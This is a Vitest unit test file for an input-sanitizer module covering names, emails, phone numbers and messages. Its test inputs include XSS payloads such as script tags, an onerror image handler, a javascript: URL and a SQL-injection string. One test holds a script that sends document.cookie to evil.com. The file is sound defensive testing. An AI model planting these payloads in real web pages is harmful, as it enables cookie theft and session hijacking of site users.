import { describe, it, expect } from 'vitest';
import {
  sanitizeInput,
  sanitizeName,
  sanitizeEmail,
  sanitizePhone,
  sanitizeMessage,
  sanitizeAllInputs,
} from '../src/lib/sanitizer';

describe('Sanitizer Module Unit Tests', () => {
  describe('sanitizeInput', () => {
    it('handles null and undefined safely', () => {
      expect(sanitizeInput(null)).toBe('');
      expect(sanitizeInput(undefined)).toBe('');
    });

    it('converts non-string primitives safely', () => {
      expect(sanitizeInput(12345)).toBe('12345');
      expect(sanitizeInput(true)).toBe('true');
    });

    it('trims leading and trailing whitespace', () => {
      expect(sanitizeInput('   Hello World   ')).toBe('Hello World');
    });

    it('normalizes excessive whitespace', () => {
      expect(sanitizeInput('Gagan       Gowda')).toBe('Gagan Gowda');
      expect(sanitizeInput('Line 1\t\t\tLine 2')).toBe('Line 1 Line 2');
    });

    it('removes script tags and script contents completely', () => {
      const input = '<script>alert("XSS")</script> Gagan!!!';
      expect(sanitizeInput(input)).toBe('Gagan!!!');
    });

    it('removes HTML tags', () => {
      const input = '<h1>Hello</h1><p>World</p>';
      expect(sanitizeInput(input)).toBe('Hello World');
    });

    it('neutralizes event handler XSS payloads', () => {
      const input = '<img src=x onerror=alert(1)> Safe text';
      expect(sanitizeInput(input)).not.toContain('onerror=');
      expect(sanitizeInput(input)).not.toContain('<img');
      expect(sanitizeInput(input)).toBe('Safe text');
    });

    it('neutralizes javascript: URLs', () => {
      const input = 'javascript:alert("XSS")';
      expect(sanitizeInput(input)).toBe('alert("XSS")');
    });

    it('removes dangerous control characters', () => {
      const input = 'Bad\x00Control\x07Char';
      expect(sanitizeInput(input)).toBe('BadControlChar');
    });

    it('enforces maximum length', () => {
      const longInput = 'A'.repeat(3000);
      expect(sanitizeInput(longInput, 100).length).toBe(100);
    });

    it('preserves SQL-like strings safely without executing (escaped plain text)', () => {
      const input = "' OR '1'='1";
      expect(sanitizeInput(input)).toBe("' OR '1'='1");
    });

    it('preserves legitimate Unicode and normal punctuation', () => {
      const input = 'Hello World! How are you? (Testing 1, 2, 3)';
      expect(sanitizeInput(input)).toBe('Hello World! How are you? (Testing 1, 2, 3)');
    });
  });

  describe('sanitizeName', () => {
    it('allows normal names', () => {
      expect(sanitizeName('John Doe')).toBe('John Doe');
    });

    it('allows hyphens, apostrophes, and unicode letters', () => {
      expect(sanitizeName("O'Connor-Smith")).toBe("O'Connor-Smith");
      expect(sanitizeName('José María')).toBe('José María');
    });

    it('strips script tags from name', () => {
      expect(sanitizeName("<script>alert('x')</script> Gagan")).toBe('Gagan');
    });

    it('enforces maximum length of 100', () => {
      const longName = 'Name '.repeat(30);
      expect(sanitizeName(longName).length).toBeLessThanOrEqual(100);
    });
  });

  describe('sanitizeEmail', () => {
    it('trims whitespace and converts to lowercase', () => {
      expect(sanitizeEmail('   GAGAN@EXAMPLE.COM   ')).toBe('gagan@example.com');
    });

    it('removes spaces inside email strings', () => {
      expect(sanitizeEmail(' gagan @ example . com ')).toBe('gagan@example.com');
    });

    it('strips HTML from email strings', () => {
      expect(sanitizeEmail('<b>admin</b>@example.com')).toBe('admin@example.com');
    });

    it('enforces maximum length of 254', () => {
      const longEmail = 'a'.repeat(300) + '@example.com';
      expect(sanitizeEmail(longEmail).length).toBeLessThanOrEqual(254);
    });
  });

  describe('sanitizePhone', () => {
    it('allows digits and leading + symbol', () => {
      expect(sanitizePhone('+91 98765-43210')).toBe('+91 98765-43210');
    });

    it('strips invalid characters and HTML tags from phone', () => {
      expect(sanitizePhone('<script></script> +1 (555) 123-4567 ABC')).toBe('+1 (555) 123-4567');
    });

    it('ensures + only appears at the start', () => {
      expect(sanitizePhone('123+456+7890')).toBe('1234567890');
    });
  });

  describe('sanitizeMessage', () => {
    it('strips HTML elements and preserves text', () => {
      const input = '<h1>Hello</h1><p>This is a <b>test</b> message.</p>';
      expect(sanitizeMessage(input)).toBe('Hello This is a test message.');
    });

    it('strips JavaScript payload completely', () => {
      const input = 'Normal text <script>fetch("http://evil.com?c=" + document.cookie)</script> end text';
      expect(sanitizeMessage(input)).toBe('Normal text end text');
    });

    it('enforces maximum length of 2000', () => {
      const longMsg = 'X'.repeat(3000);
      expect(sanitizeMessage(longMsg).length).toBe(2000);
    });
  });

  describe('sanitizeAllInputs', () => {
    it('sanitizes full payload matching example request', () => {
      const rawPayload = {
        name: "<script>alert('x')</script> Gagan!!!",
        email: " GAGAN@EXAMPLE.COM ",
        phone: "+91 98765-43210",
        message: "<h1>Hello</h1><script>alert('XSS')</script>"
      };

      const result = sanitizeAllInputs(rawPayload);

      expect(result).toEqual({
        name: "Gagan",
        email: "gagan@example.com",
        phone: "+91 98765-43210",
        message: "Hello"
      });
    });
  });
});
